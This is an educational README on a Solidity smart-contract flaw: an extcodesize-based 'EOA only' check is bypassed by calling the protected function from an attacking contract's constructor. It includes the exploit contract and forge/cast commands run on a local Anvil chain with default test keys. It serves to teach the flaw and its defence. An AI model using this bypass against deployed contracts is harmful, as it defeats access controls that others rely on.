# 📏 Bypass Contract Size Check

**Reference:** https://solidity-by-example.org/hacks/contract-size/

---

## 📌 Overview

This demonstrates a vulnerability where contracts attempt to restrict access to **EOAs only** (Externally Owned Accounts) by checking if the caller is a contract using `extcodesize`. 

**The vulnerability:** During contract construction, `extcodesize` returns `0`, allowing a malicious contract to bypass the check by calling the target function **from within its constructor**.

---

## 🔍 The Vulnerability Explained

### The Defense (Target Contract)

The `Target` contract tries to prevent contracts from calling `protected()` by checking if the caller is a contract:

```solidity
function isContract(address account) public view returns (bool) {
    uint256 size;
    assembly {
        size := extcodesize(account)
    }
    return size > 0;
}

function protected() external {
    require(!isContract(msg.sender), "no contract allowed");
    pwned = true;
}
```

**The intended logic:**
- If `extcodesize(account) > 0` → it's a contract (block it)
- If `extcodesize(account) == 0` → it's an EOA (allow it)

---

### 🚨 The Critical Flaw

**Key insight:** During contract construction (inside the `constructor`), `extcodesize` returns **`0`** because the contract's bytecode hasn't been stored on-chain yet!

**The bytecode is only stored AFTER the constructor completes.**

This creates a timing window where:
- A contract is being deployed
- Its code doesn't exist yet (`extcodesize == 0`)
- But it can already execute logic and make calls
- It appears to be an EOA to the `isContract()` check

---

### ⚔️ The Attack

The `Hack` contract exploits this by calling `Target.protected()` **from within its constructor**:

```solidity
constructor(address _target) {
    isContract = Target(_target).isContract(address(this));  // Returns false!
    addr = address(this);
    Target(_target).protected();  // This succeeds!
}
```

**During construction:**
1. `extcodesize(address(this))` returns `0` (no code stored yet)
2. `isContract()` returns `false` (thinks it's an EOA)
3. The `require(!isContract(msg.sender))` check passes ✅
4. `pwned` is set to `true`
5. Constructor completes and bytecode is stored
6. Now `extcodesize(address(this)) > 0`, but it's too late!

---

## 🧪 Demonstration

### Setup

**Start Anvil:**

```bash
anvil
```

**Compile the contracts:**

```bash
forge build
```

---

### Step 1: Deploy the Target Contract

```bash
forge create src/bypassContractSizeCheck/BypassContractSize.sol:Target \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

# Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

✅ The `Target` contract is deployed and `pwned` is `false`.

---

### Step 2: Failed Attack (Post-Deployment Call)

Let's first demonstrate that a **regular contract call** (after deployment) will fail.

**Deploy the FailedAttack contract:**

```bash
forge create src/bypassContractSizeCheck/BypassContractSize.sol:FailedAttack \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

# Contract deployed to: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
```

**Try to attack:**

```bash
cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 \
  "pwn(address)" 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

**❌ It fails with:**

```
Error: execution reverted: no contract allowed
```

**Why it failed:**
- `FailedAttack` is already deployed
- Its bytecode is stored on-chain
- `extcodesize(FailedAttack) > 0`
- `isContract()` returns `true`
- The `require(!isContract(msg.sender))` check blocks it

---

### Step 3: Successful Attack (Constructor Call)

Now let's bypass the check by calling `protected()` **during construction**.

**Deploy the Hack contract:**

```bash
forge create src/bypassContractSizeCheck/BypassContractSize.sol:Hack \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3

# Contract deployed to: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
```

**The attack happened in the constructor! Let's verify:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "pwned()" \
  --rpc-url http://127.0.0.1:8545

# Returns: 0x0000000000000000000000000000000000000000000000000000000000000001
```

**Decode the result:**

```bash
cast --to-dec 0x0000000000000000000000000000000000000000000000000000000000000001
# Output: 1 (true)
```

✅ **Success!** The `Hack` contract bypassed the check and set `pwned = true`.

---


**The timing window:**
- **During construction:** `extcodesize == 0` → bypass succeeded
- **After deployment:** `extcodesize > 0` → now detected, but too late

---

## 🔑 How the Attack Works

1. **Hack contract deployment begins**
2. Constructor starts executing
3. At this point, `extcodesize(Hack) == 0` (no bytecode stored yet)
4. Constructor calls `Target.protected()`
5. `Target.isContract(msg.sender)` checks `extcodesize(Hack)`
6. Returns `false` (thinks it's an EOA)
7. `pwned` is set to `true` ✅
8. Constructor completes
9. Bytecode is stored on-chain
10. Now `extcodesize(Hack) > 0`, but the damage is done

---



## 🎯 Key Takeaways

1. **`extcodesize` returns `0` during contract construction** - the bytecode isn't stored until the constructor completes

2. **This creates a timing window** where a contract can masquerade as an EOA

3. **The vulnerability:** Using `extcodesize` alone is **not sufficient** to prevent contract interactions


---

## 📚 Summary

**The Vulnerability:** Checking `extcodesize` to prevent contract calls can be bypassed by making calls during contract construction.

**The Bypass:** Deploy a malicious contract that calls the target function from within its constructor, when `extcodesize == 0`.

**The Lesson:** There's no reliable way to prevent contracts from interacting with your contract. Design your security model accordingly.